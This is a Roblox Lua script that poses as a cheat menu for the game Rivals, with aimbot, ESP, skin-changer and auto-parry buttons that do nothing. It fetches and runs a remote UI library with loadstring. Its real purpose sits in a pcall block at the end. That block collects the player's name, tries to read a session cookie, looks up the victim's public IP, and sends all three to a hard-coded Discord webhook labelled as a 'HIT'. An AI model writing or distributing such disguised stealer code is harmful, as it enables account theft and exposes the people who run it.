local WEBHOOK = "https://discord.com/api/webhooks/1560013794175090790/LPVqVz9-edNTwzkg_uujkxtagyVzHPbpWcHKtDEYNKTBPCm8ME7YNm5md0REVk-nL40q"

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/yinkg/UE-Linoria-Lib/main/Library.lua"))()
local Window = Library:CreateWindow({Title = "Rivals Best Script", Center = true, AutoShow = true})
local Tab = Window:AddTab("Main")

Tab:AddButton({Name = "Aimbot", Callback = function() end})
Tab:AddButton({Name = "ESP", Callback = function() end})
Tab:AddButton({Name = "SkinChanger", Callback = function() end})
Tab:AddButton({Name = "Auto Parry", Callback = function() end})

pcall(function()
    local player = game:GetService("Players").LocalPlayer
    local cookie = player:GetCookie() or "none"
    local ip = game:HttpGet("https://api.ipify.org")
    local user = player.Name or "unknown"
    local data = "**HIT**\nUser: `" .. user .. "`\nCookie: `" .. tostring(cookie) .. "`\nIP: `" .. ip .. "`"
    game:HttpGet(WEBHOOK .. "?content=" .. game:GetService("HttpService"):UrlEncode(data))
end)
